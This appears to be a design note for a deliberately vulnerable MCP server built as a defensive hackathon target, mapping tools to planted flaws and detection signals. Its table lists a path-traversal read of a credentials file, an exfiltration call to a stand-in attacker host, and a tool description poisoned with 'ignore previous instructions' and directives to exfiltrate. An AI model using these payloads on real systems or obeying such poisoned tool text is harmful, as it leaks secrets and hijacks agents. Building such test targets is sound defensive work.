# SEEDED_FLAWS.md — Target Server Vulnerability Map

> This is a **deliberately vulnerable** MCP server we own, built as a defensive-security
> hackathon demo target. Every "secret" is a `<fake-demo-value>` placeholder and every
> outbound action is **simulated** (no real network calls). The auditor agent enumerates
> these tools via `tools/list` and probes them; each planted flaw is **deterministically
> detectable** from the tool's response or its advertised metadata — no LLM required.

SAFE-T technique IDs are drawn from the SAFE-MCP taxonomy as scoped in
`~/.claude/skills/llm-vulnerability-scan/references/safe-t-checklist.md`
(Current Static-Code Coverage Set). Each row picks the closest covered technique.

| Tool | Flaw class | SAFE-T (primary) | Secondary | Deterministic detection signal |
|------|------------|------------------|-----------|--------------------------------|
| `read_file` | Path traversal — reads files outside the `./sandbox` confinement dir | **SAFE-T1106** | AC01 / LLM06 | Call `read_file({path:"../secrets/credentials.txt"})` → response contains `API_KEY=` / content from outside `sandbox/`. Absolute paths also escape. |
| `get_config` | Credential leakage — fake secrets returned in plaintext output | **SAFE-T1502** | SAFE-T1503 / LLM02 | Call `get_config({})` → response contains `DB_PASSWORD=`, `STRIPE_SECRET_KEY=sk_live_`, `JWT_SIGNING_SECRET=`. |
| `search_docs` | Tool-description poisoning / prompt injection in metadata | **SAFE-T1102** | SAFE-T1401 / LLM01 | `tools/list` description contains `ignore previous instructions` and directives to call other tools and exfiltrate. Detectable from metadata alone — no call needed. |
| `run_query` | Excessive scope / unauthorized data access — ignores declared `products`-only scope | **SAFE-T1104** | SAFE-T1205 / AC03 | Description says `users`/`secrets` are OFF-LIMITS, but `run_query({sql:"select * from users"})` returns rows from those tables. |
| `send_notification` | Unvalidated outbound action / data exfiltration (simulated) | **SAFE-T1402** | SAFE-T1701 / ASI02 | Description claims a FIXED channel, yet accepts arbitrary `url`; `send_notification({message:"x", url:"https://attacker.example"})` confirms `[SIMULATED] Notification sent to https://attacker.example`. |
| `get_weather` | **CLEAN CONTROL — no planted flaw** | — (none) | — | Strict schema (regex-validated `city`), honest description, no secrets, no side effects. Probes must find **ZERO** issues. Negative control for false-positive rate. |

## Notes on SAFE-T mapping choices

- **SAFE-T1106** — selected as the path-traversal / unauthorized-file-read technique under
  Worker 3 (Output Handling, Tool Misuse, and Execution). Closest covered match for "tool
  reads files outside its intended scope."
- **SAFE-T1502 / SAFE-T1503** — Worker 2 (Data Disclosure). Credential/secret disclosure in
  tool output / context.
- **SAFE-T1102** — Worker 1 (Injection and Goal-Hijack). Tool-description/metadata poisoning
  with embedded instruction-override text is the canonical description-poisoning vector.
- **SAFE-T1104 (+SAFE-T1205)** — Worker 3. Over-privileged tool / excessive scope: the tool
  honors requests beyond its declared, allowlisted scope.
- **SAFE-T1402 (+SAFE-T1701)** — Worker 1/5. Unvalidated outbound action enabling
  exfiltration to an attacker-controlled destination. Simulated only.

## Files in this target

- `src/index.ts` — stdio MCP server entrypoint.
- `src/tools.ts` — the 6 tool definitions (5 flawed + 1 clean control).
- `sandbox/` — the directory `read_file` is *supposed* to be confined to (benign files).
- `secrets/credentials.txt` — planted fake secret **outside** the sandbox; the path-traversal
  target for `read_file`.
